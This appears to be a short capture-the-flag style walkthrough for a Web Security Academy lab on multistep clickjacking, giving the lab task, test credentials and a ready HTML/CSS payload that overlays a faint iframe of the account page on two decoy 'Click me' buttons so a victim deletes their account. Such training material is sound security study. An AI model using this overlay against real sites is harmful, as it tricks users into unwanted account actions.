Title: Multistep clickjacking
Level: Practitioner
Desc: This lab has some account functionality that is protected by a CSRF token and also has a confirmation dialog to protect against Clickjacking. To solve this lab construct an attack that fools the user into clicking the delete account button and the confirmation dialog by clicking on "Click me first" and "Click me next" decoy actions. You will need to use two elements for this lab.
You can log in to the account yourself using the following credentials: wiener:peter 

# Walkthrough: 

First screen:
<img width="810" height="442" alt="image" src="https://github.com/user-attachments/assets/10ba7da2-df00-40d6-b8cb-2fce2ed849a1" />

Second screen: 
<img width="728" height="249" alt="image" src="https://github.com/user-attachments/assets/4f4068a3-73b5-4e81-bf6a-dd14f6034037" />


```
<style>
    #if1 {
        position:relative;
        width: 400;
        height: 850;
        opacity: 0.1;
        z-index: 2;
    }
    #div1 {
        position:absolute;
        top: 500;
        left: 50;
        z-index: 1;
    }
    #div2 {
        position:absolute;
        top: 320;
        left: 50;
        z-index: 1;
    }
</style>
<div id="div1">Click me first</div>
<div id="div2">Click me next</div>
<iframe id="if1" src="https://0a8700ee04b0555281ddf8de00de0097.web-security-academy.net/my-account"></iframe>
```



